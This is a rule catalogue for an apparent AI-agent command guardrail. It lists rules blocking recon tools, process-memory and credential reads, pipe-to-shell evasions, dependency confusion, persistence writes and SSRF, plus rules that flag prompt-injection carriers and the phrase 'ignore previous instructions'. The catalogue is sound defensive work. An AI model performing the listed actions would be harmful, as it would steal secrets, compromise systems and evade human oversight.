| `ne-block-dir-bruteforce` | BLOCK | structural | Web directory brute-force tool detected (gobuster/dirb/feroxbuster/dirsearch). These tools enumerate hidden files and endpoints at high speed — AI agents must not perform unauthorized web enumeration. MITRE T1595.003. |
| `ne-block-web-fuzzer` | BLOCK | structural | Web fuzzer detected (ffuf/wfuzz). These tools enumerate directories, parameters, and payloads at high speed — AI agents must not fuzz web applications without explicit authorization. MITRE T1595.003. |
| `ne-block-whatweb` | BLOCK | structural | whatweb fingerprints web server technology (CMS, frameworks, versions). This is active reconnaissance; AI agents must not fingerprint target systems without authorization. MITRE T1592. |
| `ne-block-sqlmap` | BLOCK | structural | sqlmap is an automated SQL injection and database exploitation tool. Running sqlmap against any target without explicit written authorization constitutes unauthorized access. MITRE T1190. |
| `ne-block-theharvester` | BLOCK | structural | theHarvester performs OSINT enumeration (emails, subdomains, employee names) against a target domain. AI agents must not perform unsolicited intelligence gathering. MITRE T1589, T1596. |
| `ne-block-recon-ng` | BLOCK | structural | recon-ng is a modular OSINT framework for harvesting intelligence about domains, people, and organizations. AI agents must not perform intelligence gathering without explicit authorization. MITRE T1596. |
| `ne-block-shodan-cli` | BLOCK | structural | Shodan CLI querying internet-wide scan data for hosts, ports, or vulnerabilities. AI agents must not perform intelligence gathering against external infrastructure. MITRE T1596.005. |
| `ne-block-amass` | BLOCK | structural | amass performs DNS enumeration and OSINT-based subdomain discovery against target domains. AI agents must not perform unsolicited attack surface mapping. MITRE T1590.005, T1596. |
| `ne-block-subfinder` | BLOCK | structural | subfinder enumerates subdomains via passive DNS, certificate logs, and public APIs. AI agents must not perform subdomain reconnaissance against external targets. MITRE T1590.005. |
| `ne-block-nuclei` | BLOCK | structural | nuclei is a template-based vulnerability scanner that actively probes targets for CVEs and misconfigurations. AI agents must not perform unauthorized vulnerability scanning. MITRE T1595.003, T1190. |
| `ne-block-dnsx` | BLOCK | structural | dnsx performs DNS brute-forcing and subdomain enumeration against target domains. AI agents must not perform DNS reconnaissance without authorization. MITRE T1590.002. |
| `ne-block-httpx` | BLOCK | structural | httpx probes hosts at scale for live HTTP services, response metadata, and technology fingerprints. AI agents must not perform bulk HTTP reconnaissance. MITRE T1595.001. |
| `ts-block-proc-mem-read` | BLOCK | regex | Reading /proc/PID/mem or /proc/PID/maps extracts raw process memory — can expose injected system prompts, in-heap API keys, and in-flight secrets (LLM07). MITRE T1057. |
| `ts-audit-proc-environ-read` | AUDIT | regex | Reading /proc/PID/environ dumps the full process environment including injected system prompts and API keys — a more thorough context-window probe than printenv (LLM07). MITRE T1057. |

### supply-chain (47 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `sc-block-npm-registry-override` | BLOCK | regex | npm install with non-standard registry override blocked. May be dependency confusion attack. |
| `sc-block-pip-extra-index` | BLOCK | structural | pip install with --extra-index-url blocked. Risk of dependency confusion. |
| `sc-block-pip-index-url` | BLOCK | structural | pip install with --index-url replaces the primary PyPI index entirely, routing all package downloads to an attacker-controlled server. More severe than --extra-index-url. |
| `sc-block-git-url-rewrite` | BLOCK | regex | git config url.*.insteadOf silently rewrites all subsequent git fetch/clone URLs in the session. Used in supply chain attacks to redirect trusted repositories to attacker-controlled sources. |
| `sc-audit-conda-channel` | AUDIT | regex | conda/mamba install from a URL-based channel bypasses verified conda-forge/defaults channels. Review before allowing. |
| `sc-block-pip-trusted-host` | BLOCK | structural | pip install with --trusted-host bypasses TLS verification. |
| `sc-block-maven-custom-repo` | BLOCK | regex | mvn with -DrepoUrl= injects a custom Maven repository, enabling dependency confusion attacks. All packages may be resolved from the attacker-controlled server. |
| `sc-block-maven-repo-local-override` | BLOCK | regex | mvn with -Dmaven.repo.local pointing to a temp or home path overrides the local Maven cache, allowing a pre-staged malicious artifact to be resolved instead of the real package. |
| `sc-audit-mvn-build` | AUDIT | regex | Maven build/install flagged for supply-chain review. Verify pom.xml repositories section before execution. |
| `sc-block-dotnet-custom-source` | BLOCK | regex | dotnet add package with --source pointing to a URL injects a custom NuGet feed. Enables dependency confusion — a package with the same name on the attacker server shadows the official one. |
| `sc-block-nuget-custom-source` | BLOCK | regex | nuget install/restore with a custom -Source URL bypasses the official NuGet gallery and enables dependency confusion attacks. |
| `sc-audit-dotnet-add` | AUDIT | regex | dotnet add package flagged for supply-chain review. Verify the package source is the official NuGet gallery. |
| `sc-block-pip-url-install` | BLOCK | regex | pip install from URL bypasses PyPI. Download and inspect first. |
| `sc-block-npm-url-install` | BLOCK | regex | npm install from URL bypasses registry verification. |
| `sc-block-npmrc-edit` | BLOCK | regex | Modification of .npmrc blocked — may redirect package resolution. |
| `sc-block-pypirc-edit` | BLOCK | regex | Modification of .pypirc blocked — may redirect package resolution. |
| `sc-block-go-mod-replace` | BLOCK | regex | go mod edit -replace redirects a Go module to an attacker-controlled path or repository, silently substituting a trusted dependency. AI agents have no legitimate need to replace module mappings. |
| `sc-block-go-env-proxy-custom` | BLOCK | regex | go env -w GOPROXY= with a non-official proxy redirects all Go module downloads to an attacker-controlled server. Only proxy.golang.org and goproxy.io are sanctioned public proxies. |
| `sc-block-go-env-nosum` | BLOCK | regex | go env -w GONOSUMCHECK/GONOSUMDB= disables the Go checksum database, allowing tampered modules to pass integrity checks undetected. |
| `sc-block-go-nosum-env-export` | BLOCK | regex | Exporting GONOSUMCHECK or GONOSUMDB disables Go module checksum verification, enabling dependency substitution attacks. |
| `sc-block-goflags-insecure-export` | BLOCK | regex | Exporting GOFLAGS with -insecure or -mod=mod disables Go module security controls globally for the session. |
| `sc-block-goproxy-env-export` | BLOCK | regex | Exporting GOPROXY pointing to a non-official URL redirects all Go module downloads to an attacker-controlled proxy. |
| `sc-block-npm-ignore-scripts-off` | BLOCK | regex | Re-enabling npm post-install scripts is risky. Keep ignore-scripts=true in agent context. |
| `sc-audit-npm-install` | AUDIT | prefix | npm package install flagged for supply-chain review. |
| `sc-audit-pip-install` | AUDIT | prefix | pip package install flagged for supply-chain review. |
| `sc-audit-yarn-add` | AUDIT | prefix | Yarn/pnpm package install flagged for supply-chain review. |
| `sc-audit-brew-install` | AUDIT | prefix | Homebrew install flagged for supply-chain review. |
| `sc-audit-go-get` | AUDIT | prefix | Go module fetch flagged for supply-chain review. |
| `sc-audit-cargo-install` | AUDIT | prefix | Cargo package install flagged for supply-chain review. |
| `sc-audit-gem-install` | AUDIT | prefix | RubyGems install flagged for supply-chain review. |
| `sc-block-lockfile-overwrite` | BLOCK | regex | Direct shell write to dependency lock file — lock files are machine-generated checksums. Hand-editing can pin a compromised version or strip integrity hashes. MITRE T1195.001. |
| `sc-audit-lockfile-edit` | AUDIT | regex | Lock file modification flagged — may indicate supply-chain tampering. MITRE T1195.001. |
| `sc-block-ml-dataset-write` | BLOCK | regex | Writing to ML training dataset files blocked. May introduce poisoned examples into fine-tuning pipeline (LLM04). |
| `sc-block-ml-dataset-append` | BLOCK | regex | Appending data to training dataset file blocked. Risk of training data poisoning (LLM04). |
| `sc-block-ml-checkpoint-replace` | BLOCK | regex | Writing to ML model checkpoint file blocked. PyTorch .pt/.pkl files can contain pickle exploits. Risk of checkpoint substitution attack (LLM04). |
| `sc-audit-ml-checkpoint-write` | AUDIT | regex | Model checkpoint file copy or move flagged. Verify source integrity before deploying (LLM04). |
| `sc-block-hf-cli-download` | BLOCK | regex | huggingface-cli download pulls a model repo from the HF Hub. Untrusted repos can ship pickle-exploit payloads that execute on load. Human review of the source required (LLM04, AML.T0010). |
| `sc-audit-hf-from-pretrained` | AUDIT | regex | Python command calling from_pretrained() to download a model from HF Hub or a remote path. Verify the source repo is trusted before execution (LLM04). |
| `sc-audit-hf-hub-download` | AUDIT | regex | Python command calling hf_hub_download() to pull a specific model file from HF Hub. Ensure the repo and revision are trusted before execution (LLM04). |
| `sc-block-dockerfile-write` | BLOCK | regex | Shell write to Dockerfile detected. Injecting malicious RUN/COPY/ENV instructions can backdoor every container built from this image. MITRE T1612. |
| `sc-block-dockerfile-tee` | BLOCK | regex | tee write to Dockerfile detected — tee copies stdin to file as positional arg. Injecting malicious content backdoors every container built from this image. MITRE T1612. |
| `sc-block-docker-compose-write` | BLOCK | regex | Shell write to docker-compose.yml detected. Tampering with compose files can mount host paths, disable security options, or add malicious service definitions. MITRE T1612. |
| `sc-audit-global-install` | AUDIT | regex | Global npm/pip install has wider system impact than a local install — flagged for review (MITRE T1195). |
| `sc-audit-yarn-pnpm-global-install` | AUDIT | regex | Global yarn/pnpm install has wider system impact than a local install — flagged for review (MITRE T1195). |
| `sc-audit-vector-db-write` | AUDIT | regex | Python invocation writing to a vector database (ChromaDB/Pinecone/Weaviate/Qdrant/FAISS) — injecting adversarial documents into a RAG knowledge base poisons AI-grounded outputs. OWASP LLM08, MITRE AML.T0010. |
| `sc-audit-vector-db-rest-write` | AUDIT | regex | curl POST/PUT to vector database REST API endpoint — injecting content into a RAG knowledge base via HTTP bypasses Python library detection. OWASP LLM08. |
| `ts-struct-block-npm-registry` | BLOCK | structural | Structural: package install with custom registry override is a supply chain risk. |

### unauthorized-execution (36 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-block-pipe-to-shell` | BLOCK | regex | Pipe-to-shell executes unreviewed remote code. |
| `ts-block-eval-subshell-rce` | BLOCK | regex | eval with remote command substitution executes unreviewed remote code — evades pipe-to-shell detection. |
| `ts-block-shell-c-remote-subshell` | BLOCK | regex | shell -c with remote subshell executes unreviewed remote code — pipe-to-shell evasion via -c flag. |
| `ts-block-source-process-sub-rce` | BLOCK | regex | source/dot with process substitution from remote downloader executes unreviewed remote code — pipe-to-shell evasion. |
| `ts-block-interpreter-inline-rce` | BLOCK | regex | Interpreter inline download-execute: fetches remote code via HTTP module and runs it with exec/eval — pipe-to-shell evasion without a pipe (OWASP LLM02). |
| `ts-block-python-inline-os-exec` | BLOCK | regex | Python inline code executing OS commands (os.system/subprocess/__import__('os')) bypasses shell-level inspection — indirect code execution evasion (OWASP LLM02). |
| `ts-block-node-inline-child-process` | BLOCK | regex | Node.js inline code importing child_process bypasses shell-level inspection — indirect code execution evasion (OWASP LLM02). |
| `ts-block-perl-ruby-inline-system` | BLOCK | regex | Perl/Ruby inline code calling system()/exec() bypasses shell-level inspection — indirect code execution evasion (OWASP LLM02). |
| `ts-audit-llm-agent-import` | AUDIT | regex | Python one-liner importing an AI agent orchestration framework. Multi-step autonomous execution without human approval is an LLM06 risk. |
| `ts-audit-llm-sdk-direct-import` | AUDIT | regex | Python one-liner directly importing an LLM SDK client. Direct invocations outside a governance wrapper are an LLM06 risk. |
| `ts-block-agent-cli-to-shell` | BLOCK | stateful | Multi-agent framework CLI output piped to an interpreter — a compromised upstream agent can embed shell commands in its output that the downstream interpreter executes immediately (OWASP LLM06/LLM08, CWE-441 unintended proxy). |
| `ts-audit-multi-agent-context-injection` | AUDIT | regex | Writing prompt-injection keywords (SYSTEM:, [INST], ignore previous instructions) to a structured data file — other agents reading this file may execute the embedded directives as authoritative instructions (OWASP LLM01/LLM08). |
| `ts-block-indirect-injection-html-comment` | BLOCK | regex | HTML comment with an agent-targeted directive — indirect prompt injection via retrieved web content; agents may execute instructions embedded in HTML comments (OWASP LLM01). |
| `ts-block-indirect-injection-llm-format` | BLOCK | regex | LLM format escape marker ([/INST], <\|start_header_id\|>system) in command — used to break out of the instruction frame and inject a new system directive in retrieved content (OWASP LLM01). |
| `ts-block-indirect-injection-markdown-alt` | BLOCK | regex | Markdown image alt-text containing an injection directive — indirect prompt injection via retrieved Markdown; agents may act on instructions embedded in image alt-text (OWASP LLM01). |
| `ts-struct-block-pipe-to-shell` | BLOCK | structural | Structural: download piped to interpreter. Download and inspect first. |
| `ts-sf-block-download-execute` | BLOCK | stateful | Stateful: direct pipe from downloader to interpreter detected (download-then-execute via pipe). |
| `ts-block-gdb-process-attach` | BLOCK | regex | gdb attached to a running process can inject arbitrary code via call system() or memory writes. Agents have no legitimate need to debug live processes. |
| `ts-block-proc-mem-write` | BLOCK | regex | Writing to /proc/PID/mem or /dev/mem injects code directly into a running process's address space, bypassing all filesystem execution controls. |
| `ts-audit-vercel-ai-sdk-install` | AUDIT | regex | Installation of the Vercel AI SDK ('ai' package). Direct model invocations without a governance wrapper are an LLM06 risk. |
| `ts-audit-vercel-ai-sdk-provider-install` | AUDIT | regex | Installation of a Vercel AI SDK provider package (@ai-sdk/openai, @ai-sdk/anthropic, @ai-sdk/google, etc.). Flags for AI governance review — LLM06 risk. |
| `ts-audit-vercel-ai-sdk-node-inline` | AUDIT | regex | Node.js inline script importing the Vercel AI SDK ('ai' package). Direct LLM invocations outside a governance wrapper are an LLM06 risk. |
| `ts-audit-ollama-serve` | AUDIT | regex | Starting a local Ollama inference server routes prompts through an unmonitored model outside organizational AI governance (LLM06, EU AI Act Art.26). Verify this deployment is approved. |
| `ts-audit-ollama-pull` | AUDIT | regex | Downloading a model via Ollama introduces weights not reviewed by the security team. Unvetted models risk model-poisoning attacks (LLM03). Verify model origin and approval. |
| `ts-audit-lmstudio-server` | AUDIT | regex | LM Studio inference server started — creates a local, unmonitored AI API endpoint outside governance controls (LLM06, EU AI Act Art.26). Verify organizational approval. |
| `ts-audit-open-interpreter-install` | AUDIT | regex | Installing Open Interpreter grants an LLM unrestricted shell access outside any governance wrapper. This is a high-risk shadow AI deployment (LLM06, NIST GOVERN-1). |
| `ts-audit-open-interpreter-run` | AUDIT | regex | Running Open Interpreter — an LLM with unrestricted shell access. Verify this is an approved, governed deployment (LLM06, EU AI Act Art.26). |
| `ts-audit-autogpt-install` | AUDIT | regex | Installing AutoGPT — an autonomous AI agent capable of recursive self-direction. Without a governance wrapper this is an unmonitored shadow AI deployment (LLM06, NIST GOVERN-1). |
| `ts-audit-git-commit-security-doc` | AUDIT | regex | git commit targeting SECURITY.md — AI-generated security documentation requires human review before committing (LLM09: misinformation propagation). |
| `ts-audit-git-commit-audit-path` | AUDIT | regex | git commit targeting audit/compliance/runbook path — AI-generated compliance content must be human-verified before it can be referenced by auditors (LLM09). |
| `ts-audit-append-security-doc` | AUDIT | regex | Shell append to compliance-sensitive documentation file — AI-generated content should be reviewed before persisting (LLM09: hallucination injection). |
| `ts-audit-agent-memory-write` | AUDIT | regex | Shell write to AI agent instruction or memory file — injecting malicious instructions poisons future agent sessions (persistent prompt injection). OWASP LLM01/LLM08. |
| `ts-block-strace-attach` | BLOCK | regex | strace attaching to a running process via -p PID intercepts all syscalls including read/write, exposing passwords, API keys, and tokens flowing through the process. MITRE T1057, T1003. |
| `ts-block-strace-credential-sniff` | AUDIT | regex | strace filtering for data-carrying syscalls (read/write/network) — commonly used to sniff credentials and API keys from running processes or commands. MITRE T1057. |
| `ts-block-ltrace-attach` | BLOCK | regex | ltrace attaching to a running process intercepts library calls including crypto and SSL functions, exposing credentials at the API level. MITRE T1057. |
| `ts-block-gcore-dump` | BLOCK | prefix | gcore dumps the entire memory of a running process to a file — exposes all heap-allocated secrets, API keys, system prompts, and in-flight credentials. MITRE T1003. |

### uncategorized (2 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-allow-readonly` | ALLOW | prefix | Read-only or informational command. |
| `ts-sem-block-high-risk` | BLOCK | semantic | Semantic: any command with critical risk intent is blocked. |

## MCP Rules

### credential-exposure (16 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-struct-block-sensitive-path-write` | BLOCK | structural | MCP tool writing to sensitive/protected path |
| `mcp-struct-block-path-traversal` | BLOCK | structural | Path traversal detected in path argument — attempt to escape intended directory |
| `mcp-struct-block-path-traversal-directory` | BLOCK | structural | Path traversal detected in directory argument — attempt to escape intended directory |
| `mcp-sec-block-ssh-access` | BLOCK | mcp_rule | Access to SSH key directories is blocked. |
| `mcp-sec-block-aws-access` | BLOCK | mcp_rule | Access to AWS credential directories is blocked. |
| `mcp-sec-block-gnupg-access` | BLOCK | mcp_rule | Access to GPG key directories is blocked. |
| `mcp-sec-block-kube-access` | BLOCK | mcp_rule | Access to Kubernetes config is blocked. |
| `mcp-sec-block-gcloud-access` | BLOCK | mcp_rule | Access to Google Cloud credentials is blocked. |
| `mcp-sec-block-dotenv-read` | AUDIT | mcp_rule | .env file access flagged for review — may contain secrets. |
| `mcp-sec-block-git-credentials` | BLOCK | mcp_rule | Git credential file access is blocked. |
| `mcp-sec-block-mysql-uri` | BLOCK | resource_rule | Direct MySQL database access via MCP is blocked. |
| `mcp-sec-block-postgres-uri` | BLOCK | resource_rule | Direct PostgreSQL database access via MCP is blocked. |
| `mcp-sec-block-redis-uri` | BLOCK | resource_rule | Direct Redis access via MCP is blocked. |
| `mcp-sec-block-mongodb-uri` | BLOCK | resource_rule | Direct MongoDB access via MCP is blocked. |
| `mcp-sec-block-ssh-uri` | BLOCK | resource_rule | Resource read of SSH key files is blocked. |
| `mcp-sec-block-aws-uri` | BLOCK | resource_rule | Resource read of AWS credential files is blocked. |

### data-exfiltration (15 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-llmdf-audit-system-prompt-read` | AUDIT | mcp_rule | Reading a file matching system_prompt* may expose operator instructions — LLM07 (System Prompt Leakage). Review whether this access is intentional. |
| `mcp-llmdf-audit-sysprompt-dotfile-read` | AUDIT | mcp_rule | Reading a hidden system prompt dotfile (.sysprompt*) may expose confidential operator instructions — LLM07 (System Prompt Leakage). |
| `mcp-llmdf-audit-training-data-read` | AUDIT | mcp_rule | Reading from a training_data/ directory may expose model training datasets — LLM02 (Sensitive Information Disclosure). Verify this access is authorized. |
| `mcp-llmdf-audit-model-weights-read` | AUDIT | mcp_rule | Reading from model_weights/ directory may expose proprietary model parameters — LLM02 (Sensitive Information Disclosure). |
| `mcp-llmdf-audit-checkpoints-read` | AUDIT | mcp_rule | Reading from a checkpoints/ directory may expose model state (weights, optimizer state) — LLM02 (Sensitive Information Disclosure). |
| `mcp-llmdf-audit-openai-config-write` | AUDIT | mcp_rule | Writing to an OpenAI config file (.openai*) may reroute AI API calls to an unauthorized endpoint — LLM06 (Excessive Agency). Human review required. |
| `mcp-llmdf-audit-anthropic-config-write` | AUDIT | mcp_rule | Writing to an Anthropic config file (.anthropic*) may reroute AI API calls to an unauthorized endpoint — LLM06 (Excessive Agency). Human review required. |
| `mcp-llmdf-audit-ai-config-write` | AUDIT | mcp_rule | Writing to an AI config file (ai_config*) may alter model selection or endpoint routing without authorization — LLM06 (Excessive Agency). |
| `mcp-struct-block-ssrf-metadata` | BLOCK | structural | SSRF detected — request to cloud metadata endpoint |
| `mcp-struct-block-ssrf-metadata-endpoint` | BLOCK | structural | SSRF detected — request to internal service via endpoint argument |
| `mcp-struct-block-ssrf-private-network` | BLOCK | structural | SSRF detected — request to private network IP range |
| `mcp-struct-block-ssrf-target` | BLOCK | structural | SSRF detected via 'target' argument — request to metadata endpoint or private network |
| `mcp-struct-block-ssrf-server` | BLOCK | structural | SSRF detected via 'server' argument — request to metadata endpoint or private network |
| `mcp-struct-block-ssrf-base-url` | BLOCK | structural | SSRF detected via 'base_url' argument — request to metadata endpoint or private network |
| `mcp-struct-audit-network-request` | AUDIT | structural | MCP tool making external network request |

### destructive-ops (17 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-fin-audit-financial-tools` | AUDIT | mcp_rule | Financial tool call flagged for review. |
| `mcp-fin-cap-transfer-amount` | BLOCK | value_limit | Token/crypto transfer exceeds safety limit of 100 units. |
| `mcp-fin-cap-transfer-quantity` | BLOCK | value_limit | Token/crypto transfer quantity exceeds safety limit. |
| `mcp-fin-cap-payment-amount` | BLOCK | value_limit | Payment amount exceeds safety limit of $1,000. |
| `mcp-fin-cap-payment-total` | BLOCK | value_limit | Payment total exceeds safety limit of $1,000. |
| `mcp-fin-cap-mint-amount` | BLOCK | value_limit | Minting amount exceeds safety limit. |
| `mcp-fin-block-negative-transfer` | BLOCK | value_limit | Negative transfer amounts are not allowed. |
| `mcp-fin-cap-withdrawal` | BLOCK | value_limit | Withdrawal exceeds safety limit of 500 units. |
| `mcp-fin-block-negative-withdrawal` | BLOCK | value_limit | Negative withdrawal amounts are not allowed. |
| `mcp-fin-cap-provision-count` | BLOCK | value_limit | Instance count exceeds safety limit of 50 — large provisioning requires human approval. |
| `mcp-fin-cap-provision-quantity` | BLOCK | value_limit | Provisioning quantity exceeds safety limit of 50. |
| `mcp-safety-block-etc-write` | BLOCK | mcp_rule | File write to /etc/ system directory is blocked. |
| `mcp-safety-block-usr-write` | BLOCK | mcp_rule | File write to /usr/ system directory is blocked. |
| `mcp-safety-block-var-write` | BLOCK | mcp_rule | File write to /var/ system directory is blocked. |
| `mcp-safety-block-root-write` | BLOCK | mcp_rule | File write to filesystem root is blocked. |
| `mcp-safety-audit-delete` | AUDIT | mcp_rule | File deletion operations flagged for review. |
| `mcp-safety-audit-process` | AUDIT | mcp_rule | Process/system management operations flagged for review. |

### mcp-safety (8 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `blocked-tool:execute_command` | BLOCK | blocked_tool | Tool 'execute_command' is blocked by default. |
| `blocked-tool:run_shell` | BLOCK | blocked_tool | Tool 'run_shell' is blocked by default. |
| `blocked-tool:run_terminal_command` | BLOCK | blocked_tool | Tool 'run_terminal_command' is blocked by default. |
| `blocked-tool:shell_exec` | BLOCK | blocked_tool | Tool 'shell_exec' is blocked by default. |
| `blocked-tool:run_bash` | BLOCK | blocked_tool | Tool 'run_bash' is blocked by default. |
| `blocked-tool:run_code` | BLOCK | blocked_tool | Tool 'run_code' is blocked by default. |
| `blocked-tool:eval_code` | BLOCK | blocked_tool | Tool 'eval_code' is blocked by default. |
| `blocked-tool:exec_code` | BLOCK | blocked_tool | Tool 'exec_code' is blocked by default. |

### persistence-evasion (5 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-persist-block-shell-profile-write` | BLOCK | structural | MCP write to shell startup dotfile — code injected here executes on every new shell session. Persistent execution without any cron/systemd entry. MITRE T1546.004. |
| `mcp-persist-block-launchagent-write` | BLOCK | structural | MCP write to macOS LaunchAgent/Daemon directory installs a persistent background service loaded on login. MITRE T1543.001. |
| `mcp-persist-block-git-hook-write` | BLOCK | structural | MCP write to .git/hooks/ installs a persistent git hook that executes on every matching git operation (commit, push, checkout, etc.) without any shell-level interception. MITRE T1546. |
| `mcp-persist-block-user-systemd-write` | BLOCK | structural | MCP write to user-level systemd/autostart directory installs a persistent service that starts without root on next login. MITRE T1543.002. |
| `mcp-persist-block-ssh-authkeys-write` | BLOCK | structural | MCP write to SSH authorized_keys adds a persistent backdoor public key granting remote shell access with no password. Write to ~/.ssh/config can proxy all SSH connections to an attacker. MITRE T1098.004. |

### privilege-escalation (2 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-struct-block-privesc-permissions` | BLOCK | structural | Privilege escalation — permission change on system-critical path |
| `mcp-struct-block-auth-bypass` | BLOCK | structural | Privilege escalation — attempt to disable authentication via config modification |

### supply-chain (7 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-sc-block-lockfile-write` | BLOCK | structural | MCP write to dependency lock file — lock files are machine-generated checksums. Hand-editing can pin a compromised version or strip integrity hashes. MITRE T1195.001. |
| `mcp-sc-block-cicd-config-write` | BLOCK | structural | MCP write to CI/CD pipeline config — pipeline modifications can inject malicious build steps, exfiltrate secrets, or backdoor release artifacts. Requires human review. MITRE T1195.002. |
| `mcp-sc-block-dockerfile-write` | BLOCK | structural | MCP write to Dockerfile or docker-compose config — injecting malicious RUN/COPY/ENV instructions backdoors every container built from this image. Requires human review. MITRE T1612, T1195.002. |
| `mcp-sc-block-training-data-write` | BLOCK | structural | MCP write to ML training dataset — injecting poisoned examples corrupts fine-tuned model behavior. MITRE AML.T0010, OWASP LLM04. |
| `mcp-sc-block-model-checkpoint-write` | BLOCK | structural | MCP write to model checkpoint file — PyTorch .pt/.pkl files can contain pickle exploits that execute on load. Checkpoint substitution backdoors every inference run. MITRE T1195.001. |
| `mcp-sc-audit-package-manifest-write` | AUDIT | structural | MCP write to package manifest — dependency changes expand the attack surface and may introduce typosquatted or compromised packages. Flagged for human review. MITRE T1195.001. |
| `mcp-sc-audit-rag-write` | AUDIT | structural | MCP tool call matching a RAG knowledge base write operation — injecting adversarial documents into a vector store poisons AI-grounded outputs without modifying the model. OWASP LLM08, MITRE AML.T0010. |

### unauthorized-execution (14 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-content-audit-security-doc-write` | AUDIT | mcp_rule | AI-generated write to SECURITY file — requires human review before committing (LLM09: misinformation propagation risk) |
| `mcp-content-audit-compliance-dir-write` | AUDIT | mcp_rule | AI-generated write to audit directory — fabricated audit results are a compliance liability (LLM09) |
| `mcp-content-audit-compliance-file-write` | AUDIT | mcp_rule | AI-generated write to compliance directory — unverified compliance claims require human sign-off (LLM09) |
| `mcp-content-audit-runbook-write` | AUDIT | mcp_rule | AI-generated write to runbook — incorrect incident response procedures are a safety risk (LLM09) |
| `mcp-persist-audit-instruction-file-write` | AUDIT | structural | MCP write to AI agent instruction or memory file — injecting malicious instructions poisons future agent sessions (persistent inter-session prompt injection). OWASP LLM01/LLM08. |
| `mcp-guardian-tool-description-poisoning` | BLOCK | mcp_rule | MCP tool description poisoning detected — hidden instructions or credential-harvesting prompts found in tool metadata |
| `mcp-struct-block-shell-execution` | BLOCK | structural | MCP tool that executes shell commands should go through AgentShield's command pipeline |
| `mcp-struct-block-prompt-injection-text` | BLOCK | structural | Prompt injection detected in text argument — attempt to manipulate LLM behavior |
| `mcp-struct-block-prompt-injection-content` | BLOCK | structural | Prompt injection detected in content argument — attempt to manipulate LLM behavior |
| `mcp-struct-block-prompt-injection-messages` | BLOCK | structural | Prompt injection detected in messages argument — attempt to manipulate LLM behavior |
| `mcp-struct-block-sql-injection-query` | BLOCK | structural | SQL injection detected in query argument |
| `mcp-struct-block-sql-injection-filter` | BLOCK | structural | SQL injection detected in filter argument |
| `mcp-struct-block-shell-in-command-arg` | BLOCK | structural | Shell command detected in command argument — possible disguised execution tool |
| `mcp-struct-block-shell-in-exec-arg` | BLOCK | structural | Shell command detected in exec argument — hidden command execution |

### uncategorized (4 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-struct-audit-changelog-write` | AUDIT | structural | AI-generated write to compliance-sensitive documentation — human review required before publishing (LLM09: hallucination injection / misinformation propagation) |
| `mcp-fin-block-all-balance-amount` | BLOCK | structural | Unbounded transfer detected — 'ALL_BALANCE' or equivalent string indicates intent to send entire balance |
| `mcp-fin-block-all-balance-value` | BLOCK | structural | Unbounded transfer detected — 'ALL_BALANCE' or equivalent string in value argument |
| `mcp-struct-block-credential-path-access` | BLOCK | structural | MCP tool accessing credential/sensitive path detected by structural match |

## Test Coverage

| Kingdom | TP | TN | Total |
|---------|----|----|-------|
| credential-exposure | 93 | 77 | 170 |
| data-exfiltration | 74 | 44 | 118 |
| destructive-ops | 67 | 39 | 106 |
| persistence-evasion | 76 | 40 | 116 |
| privilege-escalation | 77 | 44 | 121 |
| reconnaissance | 63 | 25 | 88 |
| supply-chain | 61 | 41 | 102 |
| unauthorized-execution | 81 | 56 | 137 |
| **Total** | **592** | **366** | **958** |

